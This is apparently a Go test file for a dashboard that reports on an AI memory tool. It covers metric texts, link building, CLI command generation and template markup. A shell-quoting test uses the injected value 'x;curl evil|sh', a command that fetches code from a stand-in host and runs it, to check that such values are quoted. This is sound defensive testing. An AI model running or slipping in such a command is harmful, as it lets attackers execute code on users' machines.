package dashboard

import (
	"bytes"
	"html/template"
	"strings"
	"testing"
	"time"

	"github.com/Barben360/backsight/internal/dashboard/format"
	"github.com/Barben360/backsight/internal/metrics"
	"github.com/Barben360/backsight/internal/views"
)

var en = format.Locale{}

func def(t *testing.T, id string) metrics.Def {
	t.Helper()
	d, ok := metrics.DefOf(id)
	if !ok {
		t.Fatalf("no metric %s", id)
	}
	return d
}

func i64(n int64) *int64     { return &n }
func f64(x float64) *float64 { return &x }

func TestLimitsText(t *testing.T) {
	for id, want := range map[string]string{
		"recall.hit_rate":         "Watch when it stays under its usual level two weeks running, or when even the upper bound is under 10 %.",
		"verdict.wrong_rate":      "Watch when the lower bound is over 5 %, attention over 15 %.",
		"recall.latency":          "Watch over 2.0 s, attention over 2.5 s.",
		"bank.size":               "No limit: shown for information.",
		"hooks.failures":          "Judged at once, not over two weeks.",
		"context.per_session":     "Watch when the high value is over 1.5 × the session budget.",
		"declare.coverage":        "Watch when even the upper bound is under 80 %.",
		"server.extraction_delay": "Watch over 30 min.",
	} {
		if got := limitsText(def(t, id), en); got != want {
			t.Errorf("%s: %q, want %q", id, got, want)
		}
	}
	got := limitsText(def(t, "used.turn_rate"), en)
	if want := "Watch when it stays under its usual level two weeks running. Unreliable while Claude says what it used on under 80 % of turns."; got != want {
		t.Errorf("used.turn_rate: %q, want %q", got, want)
	}
	// A metric that is better low is watched when it stays over.
	if got := limitsText(metrics.Def{Relative: true, Direction: "down"}, en); !strings.Contains(got, "stays over its usual level") {
		t.Errorf("direction down: %q", got)
	}
}

func TestBasedOnAndSmallest(t *testing.T) {
	for _, c := range []struct {
		id   string
		m    metrics.Metric
		want string
	}{
		{"verdict.wrong_rate", metrics.Metric{Status: metrics.StatusTooFew, Den: i64(14)}, "14 verdicts (20 needed)"},
		{"used.turn_rate", metrics.Metric{Den: i64(61), Tags: []string{"judged_28d"}}, "61 declared turns, last 28 days"},
		{"declare.coverage", metrics.Metric{Den: i64(1)}, "1 turn"},
		{"search.empty_rate", metrics.Metric{Den: i64(3)}, "3 searches"},
		{"bank.size", metrics.Metric{Den: i64(2)}, "2 events"},
		{"recall.hit_rate", metrics.Metric{}, "—"},
	} {
		if got := basedOn(def(t, c.id), c.m, en); got != c.want {
			t.Errorf("basedOn %s: %q, want %q", c.id, got, c.want)
		}
	}
	for _, c := range []struct {
		id   string
		mdc  *float64
		want string
	}{
		{"verdict.wrong_rate", f64(0.09), "about 9 pts"},
		{"recall.latency", f64(300), "about 300 ms"},
		{"context.per_session", f64(700), "about 700 chars"},
		{"bank.size", f64(3), "about 3"},
		{"recall.latency", nil, "not yet measurable"},
	} {
		if got := smallest(def(t, c.id), metrics.Metric{MDC: c.mdc}, en); got != c.want {
			t.Errorf("smallest %s: %q, want %q", c.id, got, c.want)
		}
	}
}

func TestDrillHref(t *testing.T) {
	none := views.Params{}
	for _, c := range []struct{ drill, want string }{
		{"backsight stats sessions --has memory --days 7", "/sessions?days=7&has=memory"},
		{"backsight stats days", "/days"},
		{"backsight stats memories --sort rate --state never_used", "/memories?sort=rate&state=never_used"},
		{"backsight stats quality --project 'my proj'", "/quality?project=my+proj"},
		{"backsight stats sessions sess-a1b2c3d4", "/sessions/sess-a1b2c3d4"},
		{"backsight stats quality --dev", "/quality?dev=1"},
		{"backsight memory stale", ""},
		{"backsight stats sessions --text", ""},
		{"backsight stats sessions --machines all", ""},
		{"backsight stats sessions --has", ""},
		{"backsight stats overview", "/"},
		{"backsight stats sessions --has 'memory", ""},
		{"backsight stats quality --project --dev", ""},
		{"backsight stats sessions .", ""},
		{"backsight stats sessions ..", ""},
		{"backsight stats nothing", ""},
		{"", ""},
	} {
		if got := drillHref(c.drill, none); got != c.want {
			t.Errorf("drillHref(%q): %q, want %q", c.drill, got, c.want)
		}
	}
	page := views.Params{Days: 30, DaysSet: true, Project: "p1", Since: "2026-10-01", Until: "2026-10-08", TZ: "Europe/Paris", Dev: true}
	for _, c := range []struct {
		p           views.Params
		drill, want string
	}{
		{views.Params{Days: 30, DaysSet: true, Project: "p1"}, "backsight stats sessions --has memory", "/sessions?days=30&has=memory&project=p1"},
		{views.Params{Days: 30, DaysSet: true}, "backsight stats sessions --has memory --days 7", "/sessions?days=7&has=memory"},
		{views.Params{Days: 7}, "backsight stats days", "/days"}, // days not given: the default window applies
		{page, "backsight stats pipeline", "/pipeline?days=30&dev=1&project=p1&since=2026-10-01&tz=Europe%2FParis&until=2026-10-08"},
		{views.Params{Project: "p1"}, "backsight stats quality --project other", "/quality?project=other"},
		{views.Params{DevSet: true}, "backsight stats days", "/days?dev=0"},
		{views.Params{Project: "p1", Limit: 2, Offset: 4}, "backsight memory stale", ""},
		{views.Params{Project: "p1"}, "backsight stats overview", "/?project=p1"},
		// The window is one group: a drill that sets part of it keeps the page's out.
		{views.Params{Since: "2026-10-01", Until: "2026-10-08", Project: "p1"}, "backsight stats sessions --days 7", "/sessions?days=7&project=p1"},
		{views.Params{Days: 30, DaysSet: true}, "backsight stats sessions --since 2026-10-01", "/sessions?since=2026-10-01"},
		{views.Params{Days: 30, DaysSet: true, Since: "2026-10-01"}, "backsight stats sessions --until 2026-10-08", "/sessions?until=2026-10-08"},
	} {
		if got := drillHref(c.drill, c.p); got != c.want {
			t.Errorf("drillHref(%q, %+v): %q, want %q", c.drill, c.p, got, c.want)
		}
	}
}

func TestCLIFor(t *testing.T) {
	for _, c := range []struct {
		view, id string
		p        views.Params
		want     string
	}{
		{"overview", "", views.Params{Days: 7, Limit: 50}, "backsight stats overview"},
		{"overview", "", views.Params{Days: 30, DaysSet: true, Project: "p1", Limit: 50}, "backsight stats overview --days 30 --project p1"},
		{"overview", "", views.Params{Project: "my proj", Limit: 50}, "backsight stats overview --project 'my proj'"},
		{"overview", "", views.Params{Project: "it's", Limit: 50}, `backsight stats overview --project 'it'\''s'`},
		{"sessions", "", views.Params{Has: "used", Limit: 2, Offset: 1}, "backsight stats sessions --limit 2 --offset 1 --has used"},
		{"quality", "", views.Params{Dev: true, Limit: 50}, "backsight stats quality --dev"},
		{"sessions", "sess-a1", views.Params{Since: "2026-10-01", Until: "2026-10-08", TZ: "UTC", Path: "/a b", Sort: "rate", State: "hidden", Limit: 50},
			"backsight stats sessions sess-a1 --since 2026-10-01 --until 2026-10-08 --tz UTC --path '/a b' --sort rate --state hidden"},
	} {
		if got := cliFor(c.view, c.id, c.p); got != c.want {
			t.Errorf("cliFor: %q, want %q", got, c.want)
		}
	}
}

func TestCLIForQuotesWhatAShellReads(t *testing.T) {
	for in, want := range map[string]string{
		"x;curl evil|sh":             `'x;curl evil|sh'`,
		"a&b":                        `'a&b'`,
		"a|b":                        `'a|b'`,
		"a\nb":                       "'a\nb'",
		"a$b":                        `'a$b'`,
		"a`b`":                       "'a`b`'",
		`a"b`:                        `'a"b'`,
		`a\b`:                        `'a\b'`,
		"a\tb":                       "'a\tb'",
		"it's":                       `'it'\''s'`,
		"a>b":                        `'a>b'`,
		"(x)":                        `'(x)'`,
		"*":                          `'*'`,
		"#x":                         `'#x'`,
		"~":                          `'~'`,
		"!x":                         `'!x'`,
		"my-proj_1.v2/a:b=c@d%e+f,g": "my-proj_1.v2/a:b=c@d%e+f,g",
	} {
		got := cliFor("overview", "", views.Params{Project: in, Limit: 50})
		if want2 := "backsight stats overview --project " + want; got != want2 {
			t.Errorf("project %q: %q, want %q", in, got, want2)
		}
	}
	if got := quoteArg(""); got != `''` {
		t.Errorf("an empty word: %q", got)
	}
	// Every free value goes through the same quoting.
	got := cliFor("sessions", "a b", views.Params{Path: "p;q", Has: "h h", Sort: "s s", State: "t t", Since: "x y", Until: "u u", TZ: "z z", Limit: 50})
	want := "backsight stats sessions 'a b' --since 'x y' --until 'u u' --tz 'z z' --path 'p;q' --has 'h h' --sort 's s' --state 't t'"
	if got != want {
		t.Errorf("free values: %q, want %q", got, want)
	}
}

func TestStatusWords(t *testing.T) {
	d := def(t, "recall.hit_rate")
	for _, c := range []struct {
		m           metrics.Metric
		learning    bool
		word, class string
	}{
		{metrics.Metric{Status: metrics.StatusOK, Borderline: true}, false, "borderline", "st-border"},
		{metrics.Metric{Status: metrics.StatusOK, Tags: []string{"unreliable"}}, false, "unreliable", "st-unrel"},
		{metrics.Metric{Status: metrics.StatusNoData}, true, "learning", "st-learn"},
		{metrics.Metric{Status: metrics.StatusOK}, true, "ok", "st-ok"},
		{metrics.Metric{Status: metrics.StatusWatch}, false, "watch", "st-watch"},
		{metrics.Metric{Status: metrics.StatusBad}, false, "attention", "st-bad"},
		{metrics.Metric{Status: metrics.StatusTooFew}, false, "too few", "st-few"},
		{metrics.Metric{Status: metrics.StatusNoData}, false, "no data", "st-few"},
		{metrics.Metric{Status: metrics.StatusInfo}, false, "info", "st-info"},
	} {
		w, cl := statusWord(d, c.m, c.learning)
		if w != c.word || cl != c.class {
			t.Errorf("%+v learning %v: %q %q, want %q %q", c.m, c.learning, w, cl, c.word, c.class)
		}
	}
}

func TestHooksFailuresDefinitionIsPlain(t *testing.T) {
	v := MetricView{ID: "hooks.failures", Def: def(t, "hooks.failures"), Found: true}
	h := headOf(v, "backsight stats pipeline", en, "", views.Params{})
	if h.Info.What != "Steps that crashed, by how they failed (crashed, stopped on an error, ran too long, was stopped, exited with an error, gave an unreadable answer, input too large, could not start). In the last 24 hours, a crash, a stop on an error, an error exit or a failed start, or any kind three times, is watched; ten or more is bad." {
		t.Errorf("What = %q", h.Info.What)
	}
	if strings.Contains(strings.ToLower(h.Info.What), "hook failure") || strings.Contains(strings.ToLower(h.Info.Name), "hook failure") {
		t.Errorf("a plain page says hook failure: %q", h.Info.What)
	}
	other := headOf(MetricView{ID: "recall.hit_rate", Def: def(t, "recall.hit_rate")}, "", en, "", views.Params{})
	if other.Info.What != def(t, "recall.hit_rate").Definition {
		t.Errorf("another metric's definition was replaced: %q", other.Info.What)
	}
}

func TestHeadOf(t *testing.T) {
	d := def(t, "recall.hit_rate")
	m := metrics.Metric{Drill: d.Drill, Tags: []string{"not_filtered"}}
	h := headOf(MetricView{ID: d.ID, Def: d, M: m, Found: true}, "cmd", en, "tile", views.Params{Days: 30, DaysSet: true})
	if h.ID != "w-recall-hit_rate-tile" || h.Level != 2 || !h.NotFiltered || h.Scope != "machine" {
		t.Errorf("head: %+v", h)
	}
	if h.Drill != "/sessions?days=30&has=memory" || h.DrillText != "See the events →" {
		t.Errorf("drill: %q %q", h.Drill, h.DrillText)
	}
	if h.Info.Label != "About Prompts that got memory" || h.Info.Href != "/defs#recall.hit_rate" || h.Info.Term != d.ID {
		t.Errorf("info: %+v", h.Info)
	}
	// No drill, no link.
	bare := headOf(MetricView{ID: d.ID, Def: d, Found: true}, "", en, "", views.Params{})
	if bare.Drill != "" || bare.DrillText != "" {
		t.Errorf("a metric without a drill has a link: %+v", bare)
	}
	if f := fixedHead("memory.at_a_glance", "Q?", "server", "x"); f.ID != "w-memory-at_a_glance" || f.Level != 2 || f.Scope != "server" {
		t.Errorf("fixed: %+v", f)
	}
	w := withInfo(fixedHead("x", "Q?", "machine", ""), "About X", "X: Q?", "x.term", "One.", "Two.")
	if w.Info.Label != "About X" || len(w.Info.Paras) != 2 || w.Info.Term != "x.term" {
		t.Errorf("withInfo: %+v", w.Info)
	}
}

func TestNoDataSentences(t *testing.T) {
	d := def(t, "recall.hit_rate")
	view := func(m metrics.Metric) MetricView { return MetricView{ID: d.ID, Def: d, M: m, Found: true} }
	nd := func(reason string) metrics.Metric {
		return metrics.Metric{Status: metrics.StatusNoData, Reason: reason}
	}
	gen := time.Date(2026, 10, 30, 13, 0, 0, 0, time.UTC)
	f := Frame{Window: "last 7 days", Windows: windowsFor("/", nil), Generated: gen}
	loc := time.UTC
	get := func(m metrics.Metric, f Frame) NoData {
		t.Helper()
		n, ok := noDataOf(view(m), f, en, loc)
		if !ok {
			t.Fatalf("%+v: no sentence", m)
		}
		return n
	}
	n := get(nd(metrics.ReasonNoEvents), f)
	if n.Text != "Nothing recorded in the last 7 days." || n.Pick != "Pick a longer window:" || len(n.Links) != 2 || n.Links[0].Label != "30 d" || n.Links[1].Label != "90 d" {
		t.Errorf("no_events: %+v", n)
	}
	f90 := f
	f90.Window = "last 90 days"
	if n = get(nd(metrics.ReasonNoEvents), f90); n.Text != "Nothing recorded in the last 90 days." || len(n.Links) != 0 || n.Pick != "" {
		t.Errorf("no_events at 90 days: %+v", n)
	}
	if n = get(nd(metrics.ReasonFeedbackOff), f); n.Text != "Memory feedback is off (" || n.Code != "feedback.enabled" ||
		n.Close != ")." || n.Tail != "Quality numbers need it. Found, Cost and Flowing still work." {
		t.Errorf("feedback_off: %+v", n)
	}
	for reason, want := range map[string]string{
		metrics.ReasonServerOnlyHost:    "This PC runs the server only: activity is recorded on the PCs that use it.",
		metrics.ReasonNotConfigured:     "No memory server is set up on this PC.",
		metrics.ReasonServerUnsupported: "This memory server does not provide it.",
		metrics.ReasonServerDown:        "Memory server not answering.",
	} {
		if n = get(nd(reason), f); n.Text != want {
			t.Errorf("%s: %q, want %q", reason, n.Text, want)
		}
	}
	last := gen.Add(-3*time.Hour - 48*time.Minute) // 09:12
	fd := f
	fd.ServerRead = &metrics.ServerState{LastOK: &last}
	if n = get(nd(metrics.ReasonServerDown), fd); n.Text != "Memory server not answering since 09:12." || n.Class != "st-watch" {
		t.Errorf("server_down: %+v", n)
	}
	fs := f
	fs.Scope = &metrics.Scope{ServerOKAt: &last}
	if n = get(nd(metrics.ReasonServerDown), fs); n.Text != "Memory server not answering since 09:12." {
		t.Errorf("server_down from the scope: %+v", n)
	}
	wd := def(t, "verdict.wrong_rate")
	tf := MetricView{ID: wd.ID, Def: wd, Found: true, M: metrics.Metric{Status: metrics.StatusTooFew, Num: i64(2), Den: i64(14)}}
	if n, ok := noDataOf(tf, f, en, loc); !ok || n.Text != "2 of 14: too few to judge. 14 verdicts; 20 are needed." || n.Class != "st-few" {
		t.Errorf("too_few: %+v %v", n, ok)
	}
	if _, ok := noDataOf(view(metrics.Metric{Status: metrics.StatusOK, Value: f64(0.5)}), f, en, loc); ok {
		t.Error("a metric with a value has a no-data sentence")
	}
}

// widgetProbe executes the widget partials on a metric.
func widgetProbe(t *testing.T, src string, data any) *node {
	t.Helper()
	tpl, err := template.New("probe").Funcs(funcs).Option("missingkey=error").ParseFS(Templates(), "frame.html")
	if err != nil {
		t.Fatal(err)
	}
	if tpl, err = tpl.New("t").Parse(src); err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	if err := tpl.ExecuteTemplate(&buf, "t", data); err != nil {
		t.Fatal(err)
	}
	return parseHTML(t, buf.String())
}

type probeData struct {
	R *metrics.Result
	L format.Locale
	P views.Params
}

const cardProbe = `{{$h := head (metric .R %q) "backsight stats overview --days 7" .L "" .P}}{{template "card-open" $h}}<p>body</p>{{template "card-close" $h}}`

func TestCardHeadMarkup(t *testing.T) {
	r := goldenResult(t, "overview")
	n := widgetProbe(t, strings.Replace(cardProbe, "%q", `"recall.hit_rate"`, 1), probeData{R: r, P: views.Params{Days: 30, DaysSet: true}})
	sec := n.first("section.card")
	if sec == nil || sec.attr("aria-labelledby") != "w-recall-hit_rate" {
		t.Fatalf("section: %v", sec)
	}
	if h := n.first("h2#w-recall-hit_rate"); h == nil || h.text() != "Does memory show up when you ask something?" {
		t.Errorf("h2: %v", h)
	}
	if c := n.first(".card-head .chip"); c == nil || c.text() != "this PC" || c.attr("title") != "Activity recorded on this PC" {
		t.Errorf("chip: %v", c)
	}
	if n.first(".chip-nf") != nil {
		t.Error("a filtered metric says not filtered")
	}
	s := n.first("details.info summary")
	if s == nil || s.attr("aria-describedby") != "w-recall-hit_rate-info" || s.attr("aria-label") != "About Prompts that got memory" {
		t.Fatalf("summary: %v", s)
	}
	pop := n.first("#w-recall-hit_rate-info")
	if pop == nil || pop.attr("role") != "note" {
		t.Fatalf("popover: %v", pop)
	}
	if term := n.first("code.term"); term == nil || codeText(term) != "recall.hit_rate" {
		t.Errorf("term: %v", term)
	}
	for _, row := range []string{"What", "Limits", "Based on", "Smallest change it can see"} {
		found := false
		for _, dt := range pop.find("dt") {
			found = found || dt.text() == row
		}
		if !found {
			t.Errorf("no %q row", row)
		}
	}
	if a := pop.first("a"); a == nil || a.attr("href") != "/defs#recall.hit_rate" || a.text() != "Definition" {
		t.Errorf("definition link: %v", a)
	}
	if c := n.first("details.cli code"); c == nil || codeText(c) != "backsight stats overview --days 7" {
		t.Errorf("cli: %v", c)
	}
	if b := n.first("details.cli button.copy"); b == nil || !b.has("hidden") {
		t.Errorf("copy button: %v", b)
	}
	if a := n.first(".card-foot a"); a == nil || a.text() != "See the events →" || a.attr("href") != "/sessions?days=30&has=memory" {
		t.Errorf("drill link: %v", a)
	}
}

func TestCardHeadServerMetricAndLevel(t *testing.T) {
	r := &metrics.Result{Metrics: map[string]metrics.Metric{"bank.size": {Tags: []string{"not_filtered"}}}}
	n := widgetProbe(t, strings.Replace(cardProbe, "%q", `"bank.size"`, 1), probeData{R: r})
	chips := n.find(".card-head .chip")
	if len(chips) != 2 || chips[0].text() != "server" || chips[1].text() != "not filtered" || chips[1].attr("title") != "Not filtered: this shows the whole memory." {
		t.Errorf("chips: %v", chips)
	}
	if n.first(".card-foot") != nil {
		t.Error("a metric without a drill has a footer")
	}
	n = widgetProbe(t, `{{$h := level (fixed "x" "Question?" "machine" "") 3}}{{template "card-open" $h}}{{template "card-close" $h}}`, nil)
	if h := n.first("h3#w-x"); h == nil || h.text() != "Question?" || n.first("h2") != nil {
		t.Errorf("tile heading: %v", h)
	}
	if n.first("details.cli") != nil {
		t.Error("a widget without a command shows a CLI disclosure")
	}
}

// codeText is the text under n, <code> contents included.
func codeText(n *node) string {
	var b strings.Builder
	var walk func(*node)
	walk = func(c *node) {
		for _, it := range c.items {
			if it.kid == nil {
				b.WriteString(it.text)
			} else {
				walk(it.kid)
			}
		}
	}
	walk(n)
	return strings.TrimSpace(b.String())
}

func TestFigAndNoDataPartials(t *testing.T) {
	d := def(t, "recall.hit_rate")
	v := MetricView{ID: d.ID, Def: d, Found: true, ShowID: true, M: metrics.Metric{Status: metrics.StatusWatch, Value: f64(0.25)}}
	n := widgetProbe(t, `{{template "fig" fig .V .L}}`, struct {
		V MetricView
		L format.Locale
	}{v, en})
	f := n.first("div.fig")
	if f == nil || f.first(".lab").text() != "Prompts that got memory" || f.first(".v").text() != "25 %" {
		t.Fatalf("fig: %v", f)
	}
	if st := f.first(".st.st-watch"); st == nil || st.text() != "watch" {
		t.Errorf("status: %v", st)
	}
	if c := f.first("code"); c == nil || codeText(c) != "recall.hit_rate" {
		t.Errorf("developer id: %v", c)
	}
	v.ShowID = false
	n = widgetProbe(t, `{{template "fig" fig .V .L}}`, struct {
		V MetricView
		L format.Locale
	}{v, en})
	if n.first("div.fig code") != nil {
		t.Error("the id shows without developer mode")
	}

	fr := Frame{Window: "last 7 days", Windows: windowsFor("/", nil)}
	n = widgetProbe(t, `{{template "nodata" nodatum .V .F .L .Loc}}`, struct {
		V   MetricView
		F   Frame
		L   format.Locale
		Loc *time.Location
	}{MetricView{ID: d.ID, Def: d, Found: true, M: metrics.Metric{Status: metrics.StatusNoData, Reason: metrics.ReasonNoEvents}}, fr, en, time.UTC})
	e := n.first("div.empty")
	if e == nil || !strings.Contains(e.text(), "Nothing recorded in the last 7 days.") || !strings.Contains(e.text(), "Pick a longer window:") {
		t.Fatalf("empty: %v", e)
	}
	if links := e.find("nav.seg a"); len(links) != 2 || links[0].attr("href") != "/?days=30" {
		t.Errorf("links: %v", links)
	}
	n = widgetProbe(t, `{{template "nodata" nodatum .V .F .L .Loc}}`, struct {
		V   MetricView
		F   Frame
		L   format.Locale
		Loc *time.Location
	}{MetricView{ID: d.ID, Def: d, Found: true, M: metrics.Metric{Status: metrics.StatusNoData, Reason: metrics.ReasonFeedbackOff}}, fr, en, time.UTC})
	if c := n.first("div.empty code"); c == nil || codeText(c) != "feedback.enabled" || !strings.HasPrefix(n.first("div.empty span").text(), "Memory feedback is off (") {
		t.Errorf("feedback_off: %v", c)
	}
	n = widgetProbe(t, `{{template "nodata" nodatum .V .F .L .Loc}}`, struct {
		V   MetricView
		F   Frame
		L   format.Locale
		Loc *time.Location
	}{MetricView{ID: d.ID, Def: d, Found: true, M: metrics.Metric{Status: metrics.StatusOK, Value: f64(0.5)}}, fr, en, time.UTC})
	if n.first(".empty") != nil {
		t.Error("the nodata partial draws a box for a metric with a number")
	}
	for _, c := range []struct {
		m     metrics.Metric
		class string
	}{
		{metrics.Metric{Status: metrics.StatusNoData, Reason: metrics.ReasonServerDown}, "st-watch"},
		{metrics.Metric{Status: metrics.StatusTooFew, Num: i64(1), Den: i64(2)}, "st-few"},
	} {
		n = widgetProbe(t, `{{template "nodata" nodatum .V .F .L .Loc}}`, struct {
			V   MetricView
			F   Frame
			L   format.Locale
			Loc *time.Location
		}{MetricView{ID: d.ID, Def: d, Found: true, M: c.m}, fr, en, time.UTC})
		if n.first(".empty."+c.class) == nil {
			t.Errorf("%+v: no .empty.%s", c.m, c.class)
		}
	}
	// A 24 h window offers the longer ones.
	fr24 := Frame{Window: "last 24 h", Windows: windowsFor("/", nil)}
	if got, _ := noDataOf(MetricView{ID: d.ID, Def: d, Found: true, M: metrics.Metric{Status: metrics.StatusNoData, Reason: metrics.ReasonNoEvents}}, fr24, en, time.UTC); len(got.Links) != 3 || got.Links[0].Label != "7 d" {
		t.Errorf("24 h window: %+v", got)
	}
	// The tail is muted, apart from the sentence.
	if m := n.first(".empty .muted"); m != nil {
		t.Errorf("a muted tail where there is none: %v", m)
	}
	n = widgetProbe(t, `{{template "nodata" nodatum .V .F .L .Loc}}`, struct {
		V   MetricView
		F   Frame
		L   format.Locale
		Loc *time.Location
	}{MetricView{ID: d.ID, Def: d, Found: true, M: metrics.Metric{Status: metrics.StatusNoData, Reason: metrics.ReasonFeedbackOff}}, fr, en, time.UTC})
	if m := n.first(".empty .xs.muted"); m == nil || m.text() != "Quality numbers need it. Found, Cost and Flowing still work." {
		t.Errorf("feedback tail: %v", m)
	}
	if n.first(".empty .st") != nil {
		t.Error("a status pill in the no-data box")
	}
	n = widgetProbe(t, `{{template "cmd" "backsight doctor"}}`, nil)
	if c := n.first("div.cmd code"); c == nil || codeText(c) != "backsight doctor" || !n.first("div.cmd button.copy").has("hidden") {
		t.Errorf("cmd: %v", c)
	}
}

func TestInfoParasAndServerChipTitle(t *testing.T) {
	n := widgetProbe(t, `{{$h := withinfo (fixed "x" "Q?" "server" "cmd") "About X" "X: Q?" "x.term" "One." "Two."}}{{template "card-open" $h}}{{template "card-close" $h}}`, nil)
	ps := n.find(".pop p")
	if len(ps) != 2 || ps[0].text() != "One." || ps[1].text() != "Two." {
		t.Errorf("paragraphs: %v", ps)
	}
	if n.first(".pop dl") != nil {
		t.Error("a fixed widget has definition rows")
	}
	if c := n.first(".card-head .chip"); c == nil || c.attr("title") != "From the memory server: all PCs" || c.first(".i-server") == nil {
		t.Errorf("server chip: %v", c)
	}
	if a := n.first(".pop a"); a != nil {
		t.Errorf("a definition link without an Href: %v", a)
	}
}

func TestHiddenStaysHidden(t *testing.T) {
	// .copy sets display, which beats the browser's [hidden]: the stylesheet
	// must say it back, or a copy button with scripts off is visible and dead.
	css, err := assetFS.ReadFile("assets/dashboard.css")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(css), "[hidden] { display: none !important; }") {
		t.Error("dashboard.css has no [hidden] rule that beats .copy")
	}
	n := widgetProbe(t, `{{template "cmd" "x"}}`, nil)
	if b := n.first("button.copy"); b == nil || !b.has("hidden") {
		t.Errorf("copy button: %v", b)
	}
}
